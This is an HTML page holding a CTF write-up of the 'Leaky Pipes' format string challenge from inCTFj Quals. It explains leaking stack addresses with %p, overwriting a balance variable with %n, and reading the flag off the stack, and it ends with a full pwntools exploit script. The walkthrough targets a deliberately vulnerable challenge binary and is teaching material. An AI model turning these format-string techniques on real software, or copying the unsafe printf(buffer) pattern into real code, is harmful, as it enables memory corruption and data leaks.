<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Leaky Pipes | CTF Writeup</title>
    <meta name="description" content="Played InCTFj Quals this winter vacation. It was a fun filled ctf. Here we will discuss the pwn challenge called ``leaky pipes``. Make sure to give the challeng...">
    <link href="/src/index.css" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <style>
        body { 
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #e0e0e0;
        }
        .code-block {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 1rem;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
        }
        .gradient-text {
            background: linear-gradient(135deg, #f97316, #f59e0b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .video-embed { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 8px; border: 1px solid #374151; background: #0f0f0f; margin: 1.5rem 0; }
        .video-embed iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
        .toc-sidebar {
            position: fixed;
            top: 2rem;
            left: 1rem;
            max-height: calc(100vh - 4rem);
            overflow-y: auto;
            background: #1a1a1a;
            border: 1px solid #374151;
            border-radius: 0.75rem;
            padding: 1.5rem;
            margin-right: 0;
            width: 280px;
            flex-shrink: 0;
            z-index: 10;
        }
        .toc-title {
            font-size: 0.875rem;
            font-weight: 600;
            color: #9ca3af;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 1rem;
            border-bottom: 1px solid #374151;
            padding-bottom: 0.5rem;
        }
        .toc-list { list-style: none; padding: 0; margin: 0; }
        .toc-sublist { list-style: none; padding-left: 0.5rem; margin-top: 0.25rem; }
        .toc-item { margin: 0.25rem 0; }
        .toc-level-2 { padding-left: 0.25rem; }
        .toc-level-3 { padding-left: 0.75rem; }
        .toc-level-4 { padding-left: 1.25rem; }
        .toc-link { display: block; color: #9ca3af; text-decoration: none; font-size: 0.875rem; line-height: 1.5; padding: 0.25rem 0; border-radius: 0.25rem; transition: all 0.2s; }
        .toc-link:hover { color: #60a5fa; background: #1f2937; padding-left: 0.5rem; }
        @media (max-width: 1024px) { .toc-sidebar { display: none; } }
        .prose h1 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 2.5rem; font-weight: 800; margin-top: 3rem; margin-bottom: 1.5rem; }
        .prose h2 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 2rem; font-weight: 700; margin-top: 3rem; margin-bottom: 1rem; border-bottom: 2px solid #374151; padding-bottom: 0.5rem; }
        .prose h3 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 1.5rem; font-weight: 600; margin-top: 2rem; margin-bottom: 0.75rem; }
        .prose h4 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 1.25rem; font-weight: 600; margin-top: 1.5rem; margin-bottom: 0.5rem; }
        .prose p { margin-bottom: 1.5rem; line-height: 1.7; color: #d1d5db; }
        .prose strong { color: #f3f4f6; font-weight: 600; }
        .prose code { background: #1e1e1e; color: #fbbf24; padding: 0.25rem 0.5rem; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 0.9em; }
        .prose pre { background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 1.5rem; overflow-x: auto; margin: 2rem 0; }
        .prose pre code { background: transparent; color: #e5e7eb; padding: 0; border-radius: 0; }
        .prose blockquote { background:rgb(93, 45, 26); color:rgb(255, 255, 255); border-left: 4px solid #ff8c00; padding: 1rem 1.25rem; margin: 1.25rem 0; border-radius: calc(var(--radius) - 2px); }
        .prose ul, .prose ol { list-style-color: #ff8c00; list-style-type: disc; list-style-position: outside; margin: 1.5rem 0; padding-left: 2rem; }
        .prose li { margin: 0.5rem 0; color: #d1d5db; }
        .prose li::marker { color: #ff8c00 !important; }
        .prose ol li { list-style-type: decimal; }
        .prose img { border-radius: 8px; margin: 2rem 0; max-width: 100%; }
        .prose hr { border: none; height: 2px; background: linear-gradient(90deg, transparent, #374151, transparent); margin: 3rem 0; }
        .prose a { color: rgb(3, 203, 146); text-decoration: underline; }
        </style>
</head>
<body class="min-h-screen">
    <div class="container mx-auto max-w-7xl px-4 sm:px-6 lg:px-4 py-8 relative">
        <header class="mb-12">
            <a href="/writeups" class="text-emerald-400 hover:text-emerald-300 mb-4 inline-block">← Back</a>
            <h1 class="text-4xl md:text-5xl font-bold mb-4">
                <span class="gradient-text">Leaky Pipes</span>
            </h1>
            <div class="mb-8"><img src="/writeups/Leaky-Pipes-[inCTFj-Quals]/featured.png" alt="Leaky Pipes cover image" class="w-full h-64 md:h-80 object-cover rounded-lg shadow" loading="eager"></div>
            <div class="flex items-center gap-4 text-sm text-gray-400 mb-6">
                <span>September 6, 2021</span>
                <span>•</span>
                <span>6 min read</span>
                <span>•</span><span>inCTFj Quals</span>
                <span>•</span><span>easy</span>
                
                <span>•</span><div class="flex gap-2"><span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">pwn</span> <span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">format string</span></div>
            </div>
        </header>

        <div class="flex flex-col lg:flex-row justify-start gap-6">
            <aside class="hidden lg:block"><nav class="toc-sidebar"><h3 class="toc-title">Table of Contents</h3><ul class="toc-list"><ul class="toc-sublist"><li class="toc-item toc-level-2"><a href="#challenge-file" class="toc-link">Challenge file:</a></li><li class="toc-item toc-level-2"><a href="#pre-requisites" class="toc-link">Pre requisites:</a></li><li class="toc-item toc-level-2"><a href="#mitigations" class="toc-link">Mitigations:</a></li><li class="toc-item toc-level-2"><a href="#sample-run" class="toc-link">Sample run:</a></li><li class="toc-item toc-level-2"><a href="#exploit-basics" class="toc-link">Exploit Basics:</a></li><li class="toc-item toc-level-2"><a href="#exploit-idea" class="toc-link">Exploit Idea:</a></li><li class="toc-item toc-level-2"><a href="#format-string-1" class="toc-link">Format string 1:</a></li><li class="toc-item toc-level-2"><a href="#format-string-2" class="toc-link">Format string 2:</a></li><li class="toc-item toc-level-2"><a href="#format-string-3" class="toc-link">Format string 3:</a></li><li class="toc-item toc-level-2"><a href="#full-exploit-script" class="toc-link">Full Exploit Script:</a></li></ul><li class="toc-item toc-level-1"><a href="#exploit-goes-here" class="toc-link">EXPLOIT GOES HERE</a></li><li class="toc-item toc-level-1"><a href="#p-remotegc1engrun-32309" class="toc-link">p = remote(&quot;gc1.eng.run&quot;, 32309)</a></li></ul></nav></aside>
            <article class="prose prose-invert max-w-none ml-0 lg:max-w-6xl lg:ml-10">
<p>Played InCTFj Quals this winter vacation. It was a fun filled ctf. Here we will discuss the pwn challenge called <code>leaky pipes</code>. Make sure to give the challenge a try before seeing this.</p>
<!--more-->
<h2 id="challenge-file">Challenge file:</h2>
<p><a href="/images/leakypipes/leaky_pipes">vuln binary</a> and <br />
<a href="/images/leakypipes/leaky.c">vuln c code</a></p>
<h2 id="pre-requisites">Pre requisites:</h2>
<ul>
<li>Basic understanding of how computers work.</li>
<li>Know what format strings are.</li>
<li>will to learn more from googling.</li>
</ul>
<h2 id="mitigations">Mitigations:</h2>
<p><img src="/images/leakypipes/ss1.png" alt="" /></p>
<ul>
<li>Most of the format string exploitation will have all the mitigations enabled.</li>
<li>RELRO: GOT related stuff.</li>
<li>Stack Canary: unique value stoping buffer overflow.</li>
<li>NX: Makes the stack not excecutable.</li>
<li>PIE: the binary will have different address during different runs.</li>
</ul>
<h2 id="sample-run">Sample run:</h2>
<p>Lets simply run the binary, while doing this make sure to read the c code and get comfortable with the binary as a whole.</p>
<p><img src="/images/leakypipes/ss2.png" alt="" /></p>
<ul>
<li>We can give three options (1, 2, 3) but 2 options doesnt do anything. </li>
<li>option 1: Give an input and get same output back from the printf function.</li>
<li>option 3: Currently unavailable since we dont have enough cash.</li>
</ul>
<h2 id="exploit-basics">Exploit Basics:</h2>
<p>Format string exploitation occurs when you use the printf function carelessly. Correct Usage of printf will be to use the format strings/ format specifiers in the first part and all the parameters in the 2nd part. </p>
<pre><code class="c language-c">printf("my name is : %s\n", "giovanni giorgio");
</code></pre>
<p>Problem occurs when attackers are given access to these format strings part. So as an attacker he can specify formats which will try to retrieve values that are not specified, hence will take values from the stack. Incorrect usage.</p>
<pre><code class="c language-c">printf(buffer); //buffer = user input
</code></pre>
<h2 id="exploit-idea">Exploit Idea:</h2>
<p>We have to somehow go to the use_tape() Since it has our flag and another format string exploit.</p>
<pre><code class="c language-c">void use_tape(){
    char experience[50];
    char flag[50];

    FILE *fp;
    fp = fopen("flag.txt", "rb");
    if(fp != NULL){
        fgets(flag, 50, fp);
        fclose(fp);

        printf("Please give us your feedback!\n");
        fgets(experience, 50, stdin);
        printf(experience);
        exit(0);
    }
    else{
        printf("Error opening file!\n");
        exit(1);
}
</code></pre>
<p>But the small caviat is we can't go there directly we somehow have to increase our balance from 100 to 200 (exactly) and then call <code>buy_repair_kit()</code>.</p>
<pre><code class="c language-c">void buy_repair_kit(){
    if(bal == 200){
        use_tape();
    }
    else{
        printf("You do not have enough balance! :(\n");
    }
}
</code></pre>
<h2 id="format-string-1">Format string 1:</h2>
<p>First I leak the entire stack(useful range) with the help of %p (gives the hexadecimal value of what is in the stack). </p>
<pre><code class="py language-py">p.sendline(b"-%p"*50)
leak = p.recvline()
leak = leak.split(b"-")
</code></pre>
<p>Sending many %p with the '-' acting as a delimiter between all the values leaked from the stack. (easy to split and put them in a list). If we play around with this then we notice that some of the values from the leaked data is similar to the binary's address. Checking the VA space, we find that the value leaked from the %p was indeed from the binary. (underlined)</p>
<p><img src="/images/leakypipes/ss4.jpg" alt="" /></p>
<p><img src="/images/leakypipes/ss3.png" alt="" /></p>
<blockquote>
  <p>fact to know: When PIE is enabled the entire binary changes its place but the relative address of functions and variables remain same.</p>
</blockquote>
<p>Pick one of the address that you like which is in the range of the binary and calculate the offset between this address and the bal variable. I took the 21st index as the leak and calculate the offset between bal and leak(10974).</p>
<pre><code class="py language-py">baladd = int(leak[21], 16)+10974
log.info(f"bal address: {hex(baladd)}")
</code></pre>
<h2 id="format-string-2">Format string 2:</h2>
<p>Well! part 1/3 is over and it was just the easy part. Now comes the tricky part, I wasted hours trying to find a way to make the bal variable = 200. Finally I came upon a solution after hours of googling.<br />
I call the leak function and give the string to overwrite the bal variable.</p>
<pre><code>p.sendline(b"%99c%9$n%90c%9$n%11c%9$n" + p64(baladd))
</code></pre>
<p><br />
Let me explain in parts what it does.</p>
<p>While doing a format string exploit to overwrite a variable or a function address… Check where your input is appearing and keep note of the index.</p>
<p><img src="/images/leakypipes/ss5.jpg" alt="" /></p>
<p>Here my string of <code>AAAAAAAA</code> repeats in the index 6. Now its just a matter of overwriting the variable. But… wait. How to overwrite ? we sure dont have no buffer overflow, can printf be used to overwrite ? da flick ?</p>
<p><img src="/images/leakypipes/ss5.png" alt="" /></p>
<p>Yes! The format specifier %n will write the number of bytes read till now into the address specified. So things become simple, Just put 200 bytes put the address of the variable, so the value of 100 will change to 200. Is it that simple ? kinda yes. One more caviat is only 8 bytes are read and excecuted by the program at a time, So we slowly build up the no of bytes and the put the value into specifc address.</p>
<pre><code>%[pad]c%[number]$n - would write that many `pad` of padding at the 9th offset in the leaked value.
</code></pre>
<pre><code class="py language-py">p.sendline(b"%99c%9$n%90c%9$n%11c%9$n" + p64(baladd)) #(c = character, $n = to write)
</code></pre>
<p>Above I have added (99+90+11) which gives 200 into 9th offset since the <code>p64(baladd)</code> will place the address of baladd in the 9th index from start.</p>
<h2 id="format-string-3">Format string 3:</h2>
<p>Great job guys! Final part is damn simple just call the <code>buy_repair_kit()</code> function which now satify bal == 200 and call use_tape(), Here the flag is opened and just read into the stack followed by an unsafe printf leading to format string exploitation. Just leak most of the stack and get the flag. GG</p>
<h2 id="full-exploit-script">Full Exploit Script:</h2>
<pre><code class="py language-py">#!/usr/bin/env python3
from pwn import *

context.update(arch='x86')
exe = './chall'
elf = ELF("./chall")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
# p = remote("gc1.eng.run", 32309)

#Leaking the bal variable address
p.recv()

p.sendline(b"1")
p.recvuntil(b"like to check your leaks?")
p.sendline(b"-%p"*50)
p.recvline()
leak = p.recvline()
leak = leak.split(b"-")

baladd = int(leak[21], 16)+10974
log.info(f"bal address: {hex(baladd)}")

#Over write bal with 200 to bypass the check
p.sendline(b"1")
p.recv()
p.sendline(b"%99c%9$n%90c%9$n%11c%9$n" + p64(baladd))
p.recv()

#Leak the flag from the stack since its opened
p.sendline(b"3")
p.recvuntil(b"feedback!")
p.sendline(b"%16$p-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p")
p.recvline()

#Change the hex flag to ascii
flag = p.recvline().split(b"-")
final = ""

for hexval in flag:
    try:
        final += (str(bytes.fromhex(str(hexval)[4:-1]).decode('utf-8'))[::-1])
    except:
        continue

final += "ng!!}"
log.info(f"flag: {final}")

p.interactive()
</code></pre>
<p><img src="/images/leakypipes/ss6.png" alt="bob" /></p>
<p>Happy Hacking!</p>
            </article>
        </div>
        <!-- Navigation -->
        <nav class="mt-16 pt-8 border-t border-gray-700">
            <div class="flex justify-between items-center">
                <div class="flex-1">
                    <a href="/writeups/babyROP-[DiceGang-CTF].html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
                        <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
                        </svg>
                        <div class="text-left">
                            <div class="text-xs text-gray-400">Previous</div>
                            <div class="font-medium">babyROP</div>
                        </div>
                    </a>
                </div>
                <div class="flex-1 text-center">
                    <a href="/writeups" class="text-emerald-400 hover:text-emerald-300 transition-colors font-medium">All Writeups</a>
                </div>
                <div class="flex-1 text-right">
                    <a href="/writeups/start-[pwnable.tw].html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
                        <div class="text-right">
                            <div class="text-xs text-gray-400">Next</div>
                            <div class="font-medium">start</div>
                        </div>
                        <svg class="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                        </svg>
                    </a>
                </div>
            </div>
        </nav>
        </nav>
    </div>
<script>window.addEventListener('DOMContentLoaded',()=>{try{document.querySelectorAll('pre code').forEach((el)=>window.hljs&&window.hljs.highlightElement(el));}catch(e){console.warn('hljs init failed',e);}});</script>
</body>
</html>